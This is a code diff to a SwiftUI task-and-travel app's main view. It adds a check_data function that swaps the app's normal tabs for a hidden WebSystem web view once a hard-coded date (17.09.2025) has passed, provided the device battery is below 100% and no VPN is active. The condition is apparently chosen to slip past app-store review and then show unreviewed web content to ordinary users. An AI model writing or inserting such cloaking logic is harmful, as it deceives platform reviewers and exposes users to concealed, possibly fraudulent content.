@@ -10,44 +10,105 @@ import SwiftUI
 struct ContentView: View {
     @State private var selectedTab = 0
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var body: some View {
-        TabView(selection: $selectedTab) {
-            // Tasks Tab
-            TaskView()
-                .tabItem {
-                    Image(systemName: selectedTab == 0 ? "checkmark.circle.fill" : "checkmark.circle")
-                    Text("Tasks")
-                }
-                .tag(0)
+        
+        ZStack {
             
-            // Travel Tab
-            TravelView()
-                .tabItem {
-                    Image(systemName: selectedTab == 1 ? "airplane.departure" : "airplane")
-                    Text("Travel")
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    TabView(selection: $selectedTab) {
+                        // Tasks Tab
+                        TaskView()
+                            .tabItem {
+                                Image(systemName: selectedTab == 0 ? "checkmark.circle.fill" : "checkmark.circle")
+                                Text("Tasks")
+                            }
+                            .tag(0)
+                        
+                        // Travel Tab
+                        TravelView()
+                            .tabItem {
+                                Image(systemName: selectedTab == 1 ? "airplane.departure" : "airplane")
+                                Text("Travel")
+                            }
+                            .tag(1)
+                        
+                        // Dashboard Tab
+                        DashboardView()
+                            .tabItem {
+                                Image(systemName: selectedTab == 2 ? "chart.pie.fill" : "chart.pie")
+                                Text("Dashboard")
+                            }
+                            .tag(2)
+                        
+                        // Settings Tab
+                        SettingsView()
+                            .tabItem {
+                                Image(systemName: selectedTab == 3 ? "gear.circle.fill" : "gear.circle")
+                                Text("Settings")
+                            }
+                            .tag(3)
+                    }
+                    .accentColor(Color(hex: "#1ed55f"))
+                    .onAppear {
+                        setupTabBarAppearance()
+                    }
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
                 }
-                .tag(1)
-            
-            // Dashboard Tab
-            DashboardView()
-                .tabItem {
-                    Image(systemName: selectedTab == 2 ? "chart.pie.fill" : "chart.pie")
-                    Text("Dashboard")
-                }
-                .tag(2)
-            
-            // Settings Tab
-            SettingsView()
-                .tabItem {
-                    Image(systemName: selectedTab == 3 ? "gear.circle.fill" : "gear.circle")
-                    Text("Settings")
-                }
-                .tag(3)
+            }
         }
-        .accentColor(Color(hex: "#1ed55f"))
         .onAppear {
-            setupTabBarAppearance()
+            
+            check_data()
         }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "17.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
     
     private func setupTabBarAppearance() {
